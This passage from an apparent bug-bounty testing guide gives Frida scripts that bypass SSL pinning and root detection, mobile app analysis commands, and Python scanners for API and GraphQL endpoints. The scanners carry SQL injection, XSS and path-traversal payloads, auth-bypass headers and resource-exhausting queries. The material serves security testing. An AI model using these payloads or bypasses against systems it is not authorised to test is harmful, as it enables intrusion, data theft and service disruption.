    var SSLContext_init = SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
    
    SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
        console.log('[+] SSL Pinning bypassed');
        SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
    };
});

// Root detection bypass
Java.perform(function() {
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        console.log('[+] Root detection bypassed');
        return false;
    };
});

// Crypto analysis
Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.getInstance.overload('java.lang.String').implementation = function(transformation) {
        console.log('[+] Cipher: ' + transformation);
        return this.getInstance(transformation);
    };
});
```

#### Android Testing Commands
```bash
# Frida usage
frida -U -f com.example.app -l frida_scripts.js --no-pause

# ADB debugging
adb shell am start -n com.example.app/.MainActivity
adb shell dumpsys activity activities | grep "Run #"
adb logcat | grep "com.example.app"

# Network traffic analysis
mitmdump -s android_intercept.py --set confdir=~/.mitmproxy

# File system analysis
adb shell find /data/data/com.example.app -type f -name "*.db" -o -name "*.xml"
adb pull /data/data/com.example.app/databases/app.db
sqlite3 app.db ".tables"
```

#### iOS Application Security Testing

#### Static Analysis (IPA Analysis)
```bash
# iOS analysis toolkit
# Installation (macOS required)
brew install class-dump
brew install otool
pip3 install ipa-analyzer
npm install -g ios-deploy

# IPA extraction and analysis
unzip app.ipa
class-dump -H Payload/App.app/App -o headers/
otool -L Payload/App.app/App  # Check linked libraries
strings Payload/App.app/App | grep -E "(http|api|secret|password)"

# Plist analysis
plutil -p Payload/App.app/Info.plist
grep -r "NSAppTransportSecurity" Payload/
grep -r "NSAllowsArbitraryLoads" Payload/
```

#### iOS Dynamic Analysis
```bash
# iOS testing with Objection
pip3 install objection
objection -g "App Name" explore

# Common objection commands
ios hooking list classes
ios hooking search methods <class>
ios keychain dump
ios nsurlsession disable
ios ui dump
```

#### iOS Security Testing Script
```python
#!/usr/bin/env python3
# ios_security_test.py - iOS security testing automation

import os
import subprocess
import plistlib
import json

class iOSSecurityTester:
    def __init__(self, ipa_path):
        self.ipa_path = ipa_path
        self.extract_dir = "ios_analysis"
        self.results = {}
        
    def extract_ipa(self):
        """Extract IPA file"""
        os.makedirs(self.extract_dir, exist_ok=True)
        subprocess.run(['unzip', '-q', self.ipa_path, '-d', self.extract_dir])
        
    def analyze_plist(self):
        """Analyze Info.plist for security issues"""
        plist_path = f"{self.extract_dir}/Payload/*.app/Info.plist"
        try:
            with open(plist_path, 'rb') as f:
                plist = plistlib.load(f)
                
            security_issues = []
            
            # Check ATS settings
            if 'NSAppTransportSecurity' in plist:
                ats = plist['NSAppTransportSecurity']
                if ats.get('NSAllowsArbitraryLoads', False):
                    security_issues.append("ATS allows arbitrary loads")
                    
            # Check URL schemes
            if 'CFBundleURLTypes' in plist:
                for url_type in plist['CFBundleURLTypes']:
                    schemes = url_type.get('CFBundleURLSchemes', [])
                    security_issues.append(f"URL schemes: {schemes}")
                    
            self.results['plist_analysis'] = security_issues
            
        except Exception as e:
            self.results['plist_analysis'] = [f"Error: {str(e)}"]
    
    def check_binary_protections(self):
        """Check binary security protections"""
        binary_path = f"{self.extract_dir}/Payload/*.app/*"
        
        try:
            # Check for PIE (Position Independent Executable)
            pie_result = subprocess.run(['otool', '-hv', binary_path], 
                                      capture_output=True, text=True)
            pie_enabled = 'PIE' in pie_result.stdout
            
            # Check for stack canaries
            canary_result = subprocess.run(['otool', '-I', binary_path], 
                                         capture_output=True, text=True)
            canary_enabled = 'stack_chk' in canary_result.stdout
            
            self.results['binary_protections'] = {
                'pie_enabled': pie_enabled,
                'stack_canary': canary_enabled
            }
            
        except Exception as e:
            self.results['binary_protections'] = {'error': str(e)}
    
    def find_hardcoded_secrets(self):
        """Find hardcoded secrets in binary"""
        binary_path = f"{self.extract_dir}/Payload/*.app/*"
        
        try:
            strings_result = subprocess.run(['strings', binary_path], 
                                          capture_output=True, text=True)
            strings_output = strings_result.stdout
            
            secrets = []
            secret_patterns = ['password', 'secret', 'api_key', 'token', 'key=']
            
            for line in strings_output.split('\n'):
                for pattern in secret_patterns:
                    if pattern.lower() in line.lower():
                        secrets.append(line.strip())
                        
            self.results['hardcoded_secrets'] = secrets[:20]  # Limit output
            
        except Exception as e:
            self.results['hardcoded_secrets'] = [f"Error: {str(e)}"]
    
    def run_analysis(self):
        """Run complete analysis"""
        print("[+] Extracting IPA...")
        self.extract_ipa()
        
        print("[+] Analyzing Info.plist...")
        self.analyze_plist()
        
        print("[+] Checking binary protections...")
        self.check_binary_protections()
        
        print("[+] Finding hardcoded secrets...")
        self.find_hardcoded_secrets()
        
        return self.results

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 ios_security_test.py <app.ipa>")
        sys.exit(1)
    
    tester = iOSSecurityTester(sys.argv[1])
    results = tester.run_analysis()
    print(json.dumps(results, indent=2))
```

### 🔌 Advanced API Security Testing

#### REST API Security Testing

#### API Discovery and Enumeration
```bash
# API endpoint discovery
# Installation
go install github.com/assetnote/kiterunner/cmd/kr@latest
pip3 install arjun
go install github.com/tomnomnom/meg@latest

# Endpoint discovery
kr scan https://api.target.com -w /path/to/api-wordlist.txt -x 20
arjun -u https://api.target.com/endpoint -m GET,POST,PUT,DELETE
meg -d 1000 -v /path/to/api-paths.txt https://api.target.com

# Parameter discovery
arjun -u https://api.target.com/users -m POST --include-headers
paramspider -d target.com --exclude png,jpg,gif,jpeg,swf,woff,svg,pdf
```

#### Advanced API Testing Script
```python
#!/usr/bin/env python3
# api_security_tester.py - Comprehensive API security testing

import requests
import json
import time
import random
from urllib.parse import urljoin
import threading

class APISecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
        if auth_token:
            self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
    
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Forwarded-Server': 'localhost'}
        ]
        
        test_endpoints = ['/admin', '/api/admin', '/api/users', '/api/internal']
        
        for endpoint in test_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            # Test without authentication
            resp = self.session.get(url)
            if resp.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'Authentication Bypass',
                    'endpoint': endpoint,
                    'method': 'No Auth Required',
                    'status_code': resp.status_code
                })
            
            # Test with bypass headers
            for headers in bypass_headers:
                resp = self.session.get(url, headers=headers)
                if resp.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'Authentication Bypass',
                        'endpoint': endpoint,
                        'method': f'Header Bypass: {headers}',
                        'status_code': resp.status_code
                    })
    
    def test_idor(self):
        """Test for Insecure Direct Object References"""
        idor_endpoints = [
            '/api/users/{id}',
            '/api/profile/{id}',
            '/api/documents/{id}',
            '/api/orders/{id}'
        ]
        
        test_ids = [1, 2, 100, 999, '../../etc/passwd', '../admin', 'admin']
        
        for endpoint_template in idor_endpoints:
            for test_id in test_ids:
                endpoint = endpoint_template.format(id=test_id)
                url = urljoin(self.base_url, endpoint)
                
                try:
                    resp = self.session.get(url)
                    if resp.status_code == 200 and len(resp.text) > 100:
                        self.vulnerabilities.append({
                            'type': 'IDOR',
                            'endpoint': endpoint,
                            'test_id': test_id,
                            'status_code': resp.status_code,
                            'response_length': len(resp.text)
                        })
                except:
                    continue
    
    def test_rate_limiting(self):
        """Test for rate limiting bypass"""
        test_endpoint = '/api/login'
        url = urljoin(self.base_url, test_endpoint)
        
        # Test basic rate limiting
        for i in range(20):
            resp = self.session.post(url, json={'username': 'test', 'password': 'test'})
            if resp.status_code != 429:  # Too Many Requests
                continue
            else:
                break
        else:
            self.vulnerabilities.append({
                'type': 'No Rate Limiting',
                'endpoint': test_endpoint,
                'description': 'No rate limiting detected after 20 requests'
            })
        
        # Test rate limiting bypass with headers
        bypass_headers = [
            {'X-Forwarded-For': f'192.168.1.{random.randint(1, 254)}'},
            {'X-Real-IP': f'10.0.0.{random.randint(1, 254)}'},
            {'User-Agent': f'TestAgent-{random.randint(1000, 9999)}'}
        ]
        
        for headers in bypass_headers:
            resp = self.session.post(url, json={'username': 'test', 'password': 'test'}, headers=headers)
            if resp.status_code != 429:
                self.vulnerabilities.append({
                    'type': 'Rate Limiting Bypass',
                    'endpoint': test_endpoint,
                    'method': f'Header: {headers}',
                    'status_code': resp.status_code
                })
    
    def test_http_methods(self):
        """Test for HTTP method vulnerabilities"""
        test_endpoints = ['/api/users', '/api/admin', '/api/config']
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
        
        for endpoint in test_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for method in methods:
                try:
                    resp = self.session.request(method, url)
                    if resp.status_code in [200, 201, 202] and method in ['PUT', 'DELETE', 'PATCH']:
                        self.vulnerabilities.append({
                            'type': 'Dangerous HTTP Method',
                            'endpoint': endpoint,
                            'method': method,
                            'status_code': resp.status_code
                        })
                except:
                    continue
    
    def test_injection_vulnerabilities(self):
        """Test for injection vulnerabilities"""
        injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        test_endpoints = ['/api/search', '/api/users', '/api/login']
        
        for endpoint in test_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for payload in injection_payloads:
                # Test in URL parameters
                try:
                    resp = self.session.get(url, params={'q': payload})
                    if self.check_injection_response(resp, payload):
                        self.vulnerabilities.append({
                            'type': 'Injection Vulnerability',
                            'endpoint': endpoint,
                            'payload': payload,
                            'method': 'GET Parameter'
                        })
                except:
                    continue
                
                # Test in POST body
                try:
                    resp = self.session.post(url, json={'input': payload})
                    if self.check_injection_response(resp, payload):
                        self.vulnerabilities.append({
                            'type': 'Injection Vulnerability',
                            'endpoint': endpoint,
                            'payload': payload,
                            'method': 'POST Body'
                        })
                except:
                    continue
    
    def check_injection_response(self, response, payload):
        """Check if response indicates successful injection"""
        error_indicators = ['error', 'exception', 'mysql', 'postgresql', 'oracle', 'sqlite']
        xss_indicators = ['<script>', 'alert(', 'javascript:']
        template_indicators = ['49', '7*7']  # For template injection
        
        response_text = response.text.lower()
        
        # SQL injection indicators
        if any(indicator in response_text for indicator in error_indicators):
            return True
        
        # XSS indicators
        if any(indicator in response.text for indicator in xss_indicators):
            return True
        
        # Template injection indicators
        if any(indicator in response.text for indicator in template_indicators):
            return True
        
        return False
    
    def run_comprehensive_test(self):
        """Run all security tests"""
        print("[+] Testing authentication bypass...")
        self.test_authentication_bypass()
        
        print("[+] Testing IDOR vulnerabilities...")
        self.test_idor()
        
        print("[+] Testing rate limiting...")
        self.test_rate_limiting()
        
        print("[+] Testing HTTP methods...")
        self.test_http_methods()
        
        print("[+] Testing injection vulnerabilities...")
        self.test_injection_vulnerabilities()
        
        return self.vulnerabilities

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 api_security_tester.py <api_base_url> [auth_token]")
        sys.exit(1)
    
    base_url = sys.argv[1]
    auth_token = sys.argv[2] if len(sys.argv) > 2 else None
    
    tester = APISecurityTester(base_url, auth_token)
    vulnerabilities = tester.run_comprehensive_test()
    
    print(f"\n[+] Found {len(vulnerabilities)} potential vulnerabilities:")
    for vuln in vulnerabilities:
        print(json.dumps(vuln, indent=2))
```

#### GraphQL Security Testing

#### GraphQL Advanced Testing
```bash
# GraphQL security testing tools
pip3 install graphql-cop
go install github.com/assetnote/surf/cmd/surf@latest
npm install -g graphql-voyager

# GraphQL endpoint discovery
echo "target.com" | subfinder -silent | httpx -silent | grep -E "(graphql|gql)" | tee graphql_endpoints.txt

# Introspection testing
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}"}'

# Query complexity testing
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:1){posts{comments{replies{author{posts{comments{replies{author{name}}}}}}}}}}"}'
```

#### GraphQL Security Testing Script
```python
#!/usr/bin/env python3
# graphql_security_tester.py - GraphQL security testing

import requests
import json
import time

class GraphQLSecurityTester:
    def __init__(self, endpoint):
        self.endpoint = endpoint
        self.session = requests.Session()
        self.vulnerabilities = []
        self.schema = None
    
    def test_introspection(self):
        """Test GraphQL introspection"""
        introspection_query = {
            "query": """
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                            type {
                                name
                                kind
                                ofType {
                                    name
                                    kind
                                }
                            }
                        }
                    }
                }
            }
            """
        }
        
        try:
            resp = self.session.post(self.endpoint, json=introspection_query)
            if resp.status_code == 200 and '__schema' in resp.text:
                self.vulnerabilities.append({
                    'type': 'Introspection Enabled',
                    'severity': 'Medium',
                    'description': 'GraphQL introspection is enabled, exposing schema'
                })
                self.schema = resp.json()
                return True
        except:
            pass
        return False
    
    def test_query_complexity(self):
        """Test for query complexity attacks"""
        complex_queries = [
            # Nested query attack
            {
                "query": """
                query {
                    user(id: 1) {
                        posts {
                            comments {
                                replies {
                                    author {
                                        posts {
                                            comments {
                                                replies {
                                                    author {
                                                        name
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                """
            },
            # Alias-based attack
            {
                "query": """
                query {
                    user1: user(id: 1) { name }
                    user2: user(id: 2) { name }
                    user3: user(id: 3) { name }
                    user4: user(id: 4) { name }
                    user5: user(id: 5) { name }
                }
                """
            }
        ]
        
        for i, query in enumerate(complex_queries):
            try:
                start_time = time.time()
                resp = self.session.post(self.endpoint, json=query)
                end_time = time.time()
                
                response_time = end_time - start_time
                
                if response_time > 5:  # If query takes more than 5 seconds
                    self.vulnerabilities.append({
                        'type': 'Query Complexity Attack',
                        'severity': 'High',
                        'query_type': f'Complex Query {i+1}',
                        'response_time': response_time,
                        'description': 'Server vulnerable to query complexity attacks'
                    })
            except:
                continue
    
    def test_batch_queries(self):
        """Test for batch query attacks"""
        batch_query = []
        for i in range(100):  # Create 100 queries
            batch_query.append({
                "query": f"query {{ user(id: {i}) {{ name email }} }}"
            })
        
        try:
            start_time = time.time()
            resp = self.session.post(self.endpoint, json=batch_query)
            end_time = time.time()
            
            response_time = end_time - start_time
            
            if resp.status_code == 200 and response_time > 3:
                self.vulnerabilities.append({
                    'type': 'Batch Query Attack',
                    'severity': 'High',
                    'batch_size': len(batch_query),
                    'response_time': response_time,
                    'description': 'Server processes batch queries without limits'
                })
        except:
            pass
    
    def test_injection_attacks(self):
        """Test for injection attacks in GraphQL"""
        injection_payloads = [
            "1' OR '1'='1",
            "1; DROP TABLE users; --",
            "1 UNION SELECT * FROM users",
            "../../../etc/passwd",
            "<script>alert('xss')</script>"
        ]
        
        for payload in injection_payloads:
            query = {
                "query": f"query {{ user(id: \"{payload}\") {{ name email }} }}"
            }
            
            try:
                resp = self.session.post(self.endpoint, json=query)
                
                # Check for SQL injection indicators
                if any(indicator in resp.text.lower() for indicator in ['error', 'mysql', 'postgresql', 'sqlite']):
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'payload': payload,
                        'description': 'GraphQL endpoint vulnerable to SQL injection'
                    })
                
                # Check for XSS
                if '<script>' in resp.text or 'alert(' in resp.text:
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'severity': 'High',
                        'payload': payload,
                        'description': 'GraphQL endpoint vulnerable to XSS'
                    })
            except:
                continue
    
    def run_security_test(self):
        """Run comprehensive GraphQL security test"""
        print("[+] Testing GraphQL introspection...")
        self.test_introspection()
        
        print("[+] Testing query complexity attacks...")
        self.test_query_complexity()
        
        print("[+] Testing batch query attacks...")
        self.test_batch_queries()
        
        print("[+] Testing injection attacks...")
        self.test_injection_attacks()
        
        return self.vulnerabilities

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 graphql_security_tester.py <graphql_endpoint>")
        sys.exit(1)
    
    tester = GraphQLSecurityTester(sys.argv[1])
    vulnerabilities = tester.run_security_test()
    
    print(f"\n[+] Found {len(vulnerabilities)} potential vulnerabilities:")
    for vuln in vulnerabilities:
        print(json.dumps(vuln, indent=2))
```

These automation scripts and one-liners will significantly speed up your bug hunting process!